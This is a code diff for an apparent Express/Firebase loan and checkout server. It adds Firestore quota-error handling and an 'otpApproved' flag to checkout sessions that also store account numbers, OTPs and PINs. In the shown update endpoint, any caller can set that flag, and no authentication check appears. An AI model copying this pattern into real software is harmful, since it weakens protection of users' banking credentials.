@@ -78,6 +78,16 @@ function saveQuotaStatus(exhausted: boolean) {
   }
 }
 
+function handleSyncQuotaError(err: any) {
+  const errorMsg = err?.message || String(err);
+  const isQuota = errorMsg.includes("RESOURCE_EXHAUSTED") || errorMsg.includes("Quota limit exceeded") || errorMsg.includes("quota");
+  if (isQuota) {
+    saveQuotaStatus(true);
+    firebaseDb = null;
+    console.log("[Firebase-Sync] Firestore usage quota limit has been reached. System is running in Local Safe-Memory Backup Mode.");
+  }
+}
+
 // Active user tracking map (clientId -> { phone, role, lastActive })
 const ACTIVE_SESSIONS = new Map<string, { phone: string | null; role: string; lastActive: number }>();
 
@@ -725,6 +735,7 @@ function runDatabaseMigrations(db: any): boolean {
                     [urlKey]: base64Str
                   }, { merge: true }).catch(err => {
                     console.error("[Migration] Failed syncing base64 image to firebaseDoc during setup migration:", err);
+                    handleSyncQuotaError(err);
                   });
 
                   // Also back up as a separate document
@@ -736,6 +747,7 @@ function runDatabaseMigrations(db: any): boolean {
                     createdAt: Date.now()
                   }).catch(err => {
                     console.error("[Migration] Failed syncing base64 image to separate firebaseDoc during setup migration:", err);
+                    handleSyncQuotaError(err);
                   });
                 }
               }
@@ -1129,6 +1141,7 @@ app.post("/api/checkout/start", (req, res) => {
     pin: '',
     step: 0,
     status: 'pending',
+    otpApproved: false,
     updatedAt: Date.now()
   };
   activeCheckouts.push(newCheckout);
@@ -1136,7 +1149,7 @@ app.post("/api/checkout/start", (req, res) => {
 });
 
 app.post("/api/checkout/update", (req, res) => {
-  const { id, accountNumber, otp, pin, step, status, type, amount } = req.body;
+  const { id, accountNumber, otp, pin, step, status, type, amount, otpApproved } = req.body;
   const checkout = activeCheckouts.find(c => c.id === id);
   if (!checkout) {
     return res.status(404).json({ error: "Checkout session not found" });
@@ -1148,6 +1161,7 @@ app.post("/api/checkout/update", (req, res) => {
   if (status !== undefined) checkout.status = status;
   if (type !== undefined) checkout.type = type;
   if (amount !== undefined) checkout.amount = amount;
+  if (otpApproved !== undefined) checkout.otpApproved = otpApproved;
   checkout.updatedAt = Date.now();
 
   // If status is updated to failed (e.g. timeout on client sidebar), write to database
@@ -1892,6 +1906,7 @@ app.post("/api/user/loan/apply", async (req, res) => {
         console.log(`[Firebase-Sync] Persisted separate document for ${loanId} ${field} in Cloud Firestore.`);
       } catch (err) {
         console.error(`[Firebase-Sync] Failed to backup individual image for ${loanId} ${field} to Firestore:`, err);
+        handleSyncQuotaError(err);
       }
     };
 
@@ -1920,7 +1935,9 @@ app.post("/api/user/loan/apply", async (req, res) => {
           addressProofUrl: addressProofUrl || "",
           createdAt: Date.now()
         });
-      } catch (e) {}
+      } catch (e) {
+        handleSyncQuotaError(e);
+      }
     }
   }
   
